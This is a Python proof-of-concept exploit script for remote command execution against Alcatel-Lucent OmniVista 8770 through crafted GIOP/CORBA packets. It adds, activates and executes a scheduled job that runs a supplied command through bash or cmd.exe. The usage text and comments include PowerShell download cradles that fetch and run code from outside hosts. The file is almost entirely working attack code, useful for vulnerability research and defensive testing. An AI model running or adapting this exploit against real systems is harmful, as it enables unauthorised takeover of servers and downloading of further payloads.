import socket
import time
import sys
import os

# ref https://blog.malerisch.net/
# Omnivista Alcatel-Lucent running on Windows Server


if len(sys.argv) < 3:
    print("Usage: %s <target> <port> <command>" % sys.argv[0])
    print("eg: %s 192.168.1.246 30024 \"powershell.exe -nop -w hidden -c $g=new-object net.webclient;IEX $g.downloadstring('http://192.168.1.40:8080/hello');\"" % sys.argv[0])
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
argument1 = ' '.join(sys.argv[3:])

# so we need to get the biosname of the target... so run this poc exploit script should be run in kali directly...

# netbiosname = os.popen("nbtscan -s : "+target+" | cut -d ':' -f2").read()
# netbiosname = netbiosname.strip("\n")
netbiosname = "hkl20065486"
# dirty functions to do hex magic with bytes...
### each variable has size byte before, which includes the string + "\x00" a NULL byte
### needs to calculate for each
###

REPLY_STATUS = {0: "NO_EXCEPTION", 1: "USER_EXCEPTION", 2: "SYSTEM_EXCEPTION", 3: "LOCATION_FORWARD"}

def decode_orb_error(data):
    """Try to extract a human-readable string from CORBA exception data."""
    if not data:
        return "(empty)"

    # 1. CDR length-prefixed string (CORBA exception bodies: 4-byte len + ASCII chars)
    if len(data) >= 5:
        for order in ('big', 'little'):
            slen = int.from_bytes(data[0:4], order)
            if 4 < slen < min(512, len(data) + 1):
                try:
                    s = data[4:4+slen].rstrip(b'\x00').decode('ascii')
                    if sum(c.isprintable() for c in s) / len(s) > 0.8:
                        # also try to grab minor code + completed after the string
                        base = 4 + slen
                        rem = base % 4
                        if rem:
                            base += 4 - rem
                        extra = ""
                        if base + 8 <= len(data):
                            minor = int.from_bytes(data[base:base+4], order)
                            completed = int.from_bytes(data[base+4:base+8], order)
                            done = {0: "No", 1: "Yes", 2: "Maybe"}.get(completed, str(completed))
                            extra = " minor=0x%x completed=%s" % (minor, done)
                        return s + extra
                except Exception:
                    pass

    # 2. Raw UTF-8 / ASCII
    try:
        s = data.decode('utf-8', errors='replace').strip('\x00').strip()
        printable = sum(c.isprintable() or c in '\n\r\t' for c in s)
        if s and printable / len(s) > 0.7:
            return s
    except Exception:
        pass

    # 3. UTF-16BE (IBM ORB non-GIOP error responses sent outside the protocol)
    try:
        s = data.decode('utf-16-be').strip('\x00').strip()
        printable = sum(c.isprintable() or c in '\n\r\t' for c in s)
        if s and printable / len(s) > 0.7:
            return s
    except Exception:
        pass

    return "(hex) " + data[:64].hex() + ("..." if len(data) > 64 else "")

def recv_giop(sock):
    """Read exactly one complete GIOP message from the socket."""
    # Read the fixed 12-byte header first
    header = b''
    while len(header) < 12:
        chunk = sock.recv(12 - len(header))
        if not chunk:
            break
        header += chunk
    if len(header) < 12 or header[:4] != b'GIOP':
        # Not GIOP — drain whatever is left with a short timeout and return it all
        sock.settimeout(1.0)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                header += chunk
        except Exception:
            pass
        finally:
            sock.settimeout(None)
        return header
    big_endian = (header[6] == 0)
    msg_size = int.from_bytes(header[8:12], 'big' if big_endian else 'little')
    body = b''
    while len(body) < msg_size:
        chunk = sock.recv(msg_size - len(body))
        if not chunk:
            break
        body += chunk
    return header + body

def check_reply(data, phase):
    if len(data) < 12:
        print("[!] %s: response too short (%d bytes) - raw: %s" % (phase, len(data), data.hex()))
        return False

    if data[:4] != b'GIOP':
        print("[!] %s: non-GIOP response: %s" % (phase, decode_orb_error(data)))
        return False

    msg_type = data[7]
    if msg_type != 1:
        print("[!] %s: expected Reply (1) but got message type %d" % (phase, msg_type))
        return False

    big_endian = (data[6] == 0)
    order = 'big' if big_endian else 'little'
    minor_version = data[5]
    print("[*] %s: GIOP 1.%d %s-endian, %d bytes total" % (
        phase, minor_version, 'big' if big_endian else 'little', len(data)))
    print("[*] %s: header hex: %s" % (phase, data[:32].hex()))

    if minor_version >= 2:
        # GIOP 1.2+: request_id (4), reply_status (4), service_context (variable)
        if len(data) < 20:
            print("[!] %s: truncated GIOP 1.2 reply" % phase)
            return False
        status = int.from_bytes(data[16:20], order)
        exc_data = data[20:]
    else:
        # GIOP 1.0/1.1: service_context (variable), request_id (4), reply_status (4)
        offset = 12
        ctx_count = int.from_bytes(data[offset:offset+4], order)
        print("[*] %s: service_context count=%d" % (phase, ctx_count))
        offset += 4
        for i in range(ctx_count):
            if offset + 8 > len(data):
                print("[!] %s: truncated service context list at ctx %d, offset %d, len %d" % (
                    phase, i, offset, len(data)))
                return False
            ctx_id  = int.from_bytes(data[offset:offset+4], order)
            ctx_data_len = int.from_bytes(data[offset+4:offset+8], order)
            print("[*] %s: ctx[%d] id=0x%x data_len=%d" % (phase, i, ctx_id, ctx_data_len))
            offset += 8 + ctx_data_len
            rem = offset % 4
            if rem:
                offset += 4 - rem
        if offset + 8 > len(data):
            print("[!] %s: truncated reply header at offset %d, len %d" % (phase, offset, len(data)))
            return False
        request_id = int.from_bytes(data[offset:offset+4], order)
        status     = int.from_bytes(data[offset+4:offset+8], order)
        print("[*] %s: request_id=%d reply_status=%d (at offset %d)" % (phase, request_id, status, offset))
        exc_data = data[offset+8:]

    status_str = REPLY_STATUS.get(status, "UNKNOWN(%d)" % status)
    if status == 0:
        print("[+] %s: %s" % (phase, status_str))
    else:
        print("[!] %s: %s" % (phase, status_str))
        if exc_data:
            print("    %s" % decode_orb_error(exc_data))
    return status == 0

def calcsize(giop):

	s = len(bytes.fromhex(giop))
	h = hex(s) #"\x04" -> "04"
	return h[2:].zfill(8) # it's 4 bytes for the size

def calcstring(param): # 1 byte size calc

	s = (len(param)//2)+1
	h = hex(s)
	return h[2:].zfill(2) # assuming it is only 1 byte , again it's dirty...

def calcstring2(param):

	s = (len(param)//2)+1
	h = hex(s)
	return h[2:].zfill(4)



##

#GIOP request size is specified at the 11th byte

# 0000   47 49 4f 50 01 00 00 00 00 00 00 d8 00 00 00 00  GIOP............
# d8 is the size of GIOP REQUEST

# GIOP HEADER Is 12 bytes -
# GIOP REQUEST PAYLOAD comes after and it's defined at the 11th byte



#phase 1 - add a jobset

giopid = 1 # an arbitrary ID can be put there...

# there are checks in the size of the username.. need to find where the size is specified - anyway, 58 bytes seems all right...

usernamedata = "xxx.y.zzzzz,cn=Administrators,cn=8770 administration,o=nmc".encode().hex() # original "383737302061646d696e697374726174696f6e2c6f3d6e6d63"

#print "Size of usernamedata" + str(len(bytes.fromhex(usernamedata)))

jobname = "MYJOB01".encode().hex() # size of 7 bytes # check also in the captured packet...


addjobset = "47494f50010000000000012600000000" + "00000001" + "01000000000000135363686564756c6572496e7465726661636500000000000a4164644a6f625365740000000000000000000008" + jobname + "00000007e0000000060000001b00000010000000240000000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083131313131313100010000000000000000000000000000010000000000000000000000000000003f7569643d" + usernamedata + "00000000000a6f6d6e69766973626200" # this last part can be changed???

print("Alcatel Lucent Omnivista 8770 2.0, 2.6 and 3.0 - RCE via GIOP/CORBA - @malerisch")
print("Connecting to target...")




p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
p.connect((target, port))


#p = remote(target, 30024, "ipv4", "tcp")

print("Adding a job...")

p.send(bytes.fromhex(addjobset))

#p.recv()

data = recv_giop(p)

s = len(data)
check_reply(data, "AddJobSet")

#objectkey = "" # last 16 bytes of the response!

objectkey = data[s-16:s].hex()
print("[*] objectkey: %s" % objectkey)
print("[*] AddJobSet raw response: %s" % data.hex())

# phase 2 - active jobset

print("Sending active packet against the job")

activegiopid = 2
active = "47494f50010000000000003100000000" + "00000002" + "0100000000000010" + objectkey +  "0000000741637469766500000000000000"

#print active

p.send(bytes.fromhex(active))

data2 = recv_giop(p)
check_reply(data2, "Active")

# phase3 add task

addjobid = 3

print("Adding a task....")

taskname = "BBBBBBB".encode().hex()
servername = netbiosname.encode().hex()
# command = r"C:\Windows\System32\cmd.exe".encode().hex() #on 32bit Windows
#command = r"C:\Windows\SysWOW64\cmd.exe".encode().hex() #on 64bit Windows
command = "/bin/bash".encode().hex() #on Linux
commandsize = hex((len(bytes.fromhex(command))+1))
commandsize = str(commandsize).replace("0x","").zfill(2)

#print "Command size: "+ str(commandsize)

#print bytes.fromhex(command)

#time.sleep(10)

#powershell = str(command)
#powershell = "powershell.exe -nop -c $J=new-object net.webclient;IEX $J.downloadstring('http://192.168.1.40:8080/hello');"

#-nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://10.190.127.154:8080/');

#-nop -w hidden -c $J=new-object net.webclient;$J.proxy=[Net.WebRequest]::GetSystemWebProxy();$J.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $J.downloadstring('http://10.190.127.154:8080/');

# argument = ("/c "+argument1).encode().hex()   # Windows cmd.exe
argument = ("-c "+argument1).encode().hex() # Linux bash
#argument = str("/c notepad.exe").encode().hex()

#print len(bytes.fromhex(argument))

#argumentsize = len(str("/c "+powershell))+1

#print "Argument size: "+str(argumentsize)

argumentsize = calcstring2(argument)

#print "argument size: "+str(argumentsize)

#print bytes.fromhex(argument)

def calcpadd(giop):
	defaultpadding = "00000000000001"
	check = giop + defaultpadding + fixedpadding
	s = len(check)
	#print "Size: "+str(s)
	if (s//2) % 4 == 0:
		#print "size ok!"
		return check
	else:
		# fix the default padding
		#print "Size not ok, recalculating padd..."
		dif = (s//2) % 4
		#print "diff: "+str(dif)
		newpadding = defaultpadding[dif*2:]
		#print "Newpadding: " +str(newpadding)
		return giop + newpadding + fixedpadding




addjobhdr = "47494f5001000000" # 8 bytes + 4 bytes for message size, including size of the giop request message

fixedpadding = "000000000000000100000000000000010000000000000002000000000000000000000000000000000000000f0000000000000000000000000000000000000002000000000000000000000000"

variablepadding = "000000000001"

#print calcstring(servername)
#print calcstring(taskname)

#print "Command:" +str(command)
#print "command size:"+str(commandsize)

addjob = "00000000000000b30100000000000010" + objectkey + "000000074164644a6f62000000000000000000" + calcstring(taskname) + taskname + "0000000001000000"+ commandsize + command  +"00000000" + calcstring(servername) + servername + "000000" + argumentsize + argument + "00"

#print addjob

addjobfin = calcpadd(addjob)

#print bytes.fromhex(addjobfin)

addjobsize = calcsize(addjobfin)

#print "Lenght of the addjob: "+str(len(bytes.fromhex(addjobfin)))

# we need to add the header

finalmsg = addjobhdr + addjobsize + addjobfin


p.send(bytes.fromhex(finalmsg))

data3 = recv_giop(p)
check_reply(data3, "AddJob")

# phase4 - execute task

executeid = 4

print("Executing task...")

execute = "47494f50010000000000003500000000000001100100000000000010" + objectkey + "0000000b457865637574654e6f7700000000000000"

p.send(bytes.fromhex(execute))

data4 = recv_giop(p)
check_reply(data4, "ExecuteNow")

print("All packets sent...")
print("Exploit sequence completed, command should have been executed...:-)")

p.close()

# optional requests to remove the job after the exploitation

### in metasploit, we should migrate to another process and then call an "abort" function of Omnivista

##phase5 - abort the job

canceljob = "47494f500100000000000030000000000000008e0100000000000010" + objectkey + "0000000743616e63656c000000000000"

###phase6 - delete the jobset

deletejob = "47494f500100000000000038000000000000009e0100000000000010" + objectkey + "0000000d44656c6574654a6f625365740000000000000000"
